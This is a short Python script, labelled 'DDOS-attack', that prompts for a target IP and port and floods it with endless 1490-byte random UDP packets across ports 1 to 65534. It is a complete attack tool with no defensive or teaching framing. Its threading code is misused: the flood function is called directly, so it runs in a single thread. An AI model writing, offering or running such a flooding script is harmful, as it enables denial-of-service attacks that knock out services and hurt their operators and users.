import sys
import os
import threading
import time
import socket
import random
# Code Time
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = os.urandom(1490)
#############
print("DDOS-attack")
ip = input("IP Target:")
port = int(input("Port:"))

print("ddos-attack start after 3 second")

time.sleep(3)


def run_send(ip, port):
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        # print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
        if port == 65534:
            port = 1


t1 = threading.Thread(target=run_send(ip, port), name='send')
t2 = threading.Thread(target=run_send(ip, port), name='send2')
t1.start()
t2.start()
t1.join()
t2.join()
